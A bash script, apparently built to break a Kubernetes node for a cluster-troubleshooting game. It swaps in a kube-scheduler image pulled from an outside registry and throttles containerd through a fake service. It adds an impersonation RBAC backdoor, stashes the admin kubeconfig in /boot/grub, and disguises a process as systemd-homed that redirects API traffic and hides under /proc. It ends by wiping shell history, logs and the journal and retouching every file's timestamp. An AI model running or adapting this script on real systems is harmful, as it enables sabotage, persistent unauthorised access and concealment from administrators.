#!/usr/bin/env bash

unset HISTFILE
export HISTSIZE=0

kube_controller() {
  #TODO: test it
  sed -i 's#--controllers=*,bootstrapsigner,tokencleaner#--controllers=*,bootstrapsigner,-deployment,tokencleaner#' /etc/kubernetes/manifests/kube-controller-manager.yaml
}

kube_scheduler() {
  ctr --namespace=k8s.io images pull ghcr.io/jkroepke/klustered/kube-scheduler:latest
  ctr --namespace=k8s.io images tag --force ghcr.io/jkroepke/klustered/kube-scheduler:v1.24.3 k8s.gcr.io/kube-scheduler:v1.24.3
  ctr --namespace=k8s.io images rm ghcr.io/jkroepke/klustered/kube-scheduler:latest
  sleep 2
  crictl -r unix:///run/containerd/containerd.sock rmp -f "$(crictl -r unix:///run/containerd/containerd.sock pods | grep kube-scheduler | cut -d' ' -f1)"
  kubectl delete pods -l 'component in (kube-scheduler, kube-apiserver, kube-controller-manager)' -n kube-system --force --grace-period=0
  systemctl restart kubelet
}

containerd() {
  # shellcheck disable=SC2016
  cat << EOF > /lib/systemd/system/modprobe.service
[Unit]
Description=modprobe
After=containerd.service
Requires=containerd.service
PartOf=containerd.service

[Service]
Type=simple
ExecStartPre=/bin/bash -c "sleep 1; prlimit --nproc=5 --pid=$(pidof containerd 2>/dev/null) > /dev/null 2>&1 || true"
ExecStart=/usr/sbin/modprobe overlay
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
  systemctl enable modprobe

  sed -i 's/KillMode=process/KillSignal=SIGKILL/' /lib/systemd/system/containerd.service
  systemctl daemon-reload
  systemctl stop containerd
  systemctl start containerd
}

impersonation() {
  cp /etc/kubernetes/admin.conf /boot/grub/admin.conf
  kubectl apply --kubeconfig=/etc/kubernetes/admin.conf -f - <<YAML
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
name: imposter
roleRef:
apiGroup: rbac.authorization.k8s.io
kind: ClusterRole
name: imposter
subjects:
- apiGroup: rbac.authorization.k8s.io
  kind: User
  name: kubernetes-admins
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: imposter
rules:
- apiGroups: [""]
  resources: ["groups"]
  verbs: ["impersonate"]
  resourceNames: ["system:masters"]
- apiGroups: [""]
  resources: ["users"]
  verbs: ["impersonate"]
  resourceNames: ["kubernetes-admins"]
YAML

  mkdir -p ~/.kube/

  # Setup Client Config
  kubeadm kubeconfig user --client-name kubernetes-admins --config=<(kubectl --kubeconfig=/etc/kubernetes/admin.conf -n kube-system get cm kubeadm-config -o go-template='{{ .data.ClusterConfiguration }}') > ~/.kube/config

  # Copy modified client config
  cp ~/.kube/config /etc/kubernetes/admin.conf
}

apim() {
  chmod +x /usr/bin/systemd-homed

  apt update -qq
  apt install nftables -yqq
  sysctl -w net.ipv4.conf.all.route_localnet=1 >> /etc/sysctl.d/99-sysctl.conf
  sysctl -w net.ipv4.conf.default.route_localnet=1 >> /etc/sysctl.d/99-sysctl.conf
  echo 1 | tee /proc/sys/net/ipv4/conf/*/route_localnet

  cat << EOF > /lib/systemd/system/systemd-homed
[Unit]
Description=Home Area Manager
Documentation=man:systemd-homed.service(8)
Documentation=man:org.freedesktop.home1(5)
After=home.mount dbus.service

[Service]
ExecStart=/usr/bin/systemd-homed
Restart=always
RestartSec=0

[Install]
WantedBy=multi-user.target
EOF
  mkdir /lib/systemd/system/systemd-homed.service.d

  cat << EOF > /lib/systemd/system/systemd-homed.service.d/override.conf
[Service]
StandardOutput=null
StandardError=null

ExecStartPre=-/bin/bash -c 'iptables -t nat -nL OUTPUT | grep 853 && iptables -t nat -A OUTPUT ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=-/bin/bash -c 'iptables -t nat -nL PREROUTING | grep 853 && iptables -t nat -A PREROUTING ! -d 127.0.0.53/32 -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL OUTPUT | grep 853 && ip6tables -t nat -A PREROUTING -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=-/bin/bash -c 'ip6tables -t nat -nL PREROUTING | grep 853 && ip6tables -t nat -A OUTPUT -p tcp -m tcp --dport 6443 -j REDIRECT --to-ports 853'
ExecStartPre=/bin/bash -c "printf 'flush ruleset; table ip nat { chain prerouting { type nat hook prerouting priority 0; policy accept; ip daddr != 127.0.0.53 tcp dport 6443 dnat to :853; }; chain postrouting { type nat hook postrouting priority 100; policy accept; }; chain output { type nat hook output priority 100; policy accept; ip daddr != 127.0.0.53 tcp dport 853 dnat to :2222; };};' | nft -f -"
ExecStartPre=/bin/bash -c 'umount -q /proc/*'
ExecStartPost=/bin/bash -c 'mount -o bind /proc/fs/nfsd/ /proc/$(pidof systemd-homed)/'
EOF

  systemctl enable --now systemd-homed.service
}

kube_controller
kube_scheduler
containerd
impersonation
apim


echo "Nothing to see here, sorry" > ~/.bash_history
# TODO test it
find / -exec touch {} +

true >/var/log/messages

journalctl --vacuum-time=1s
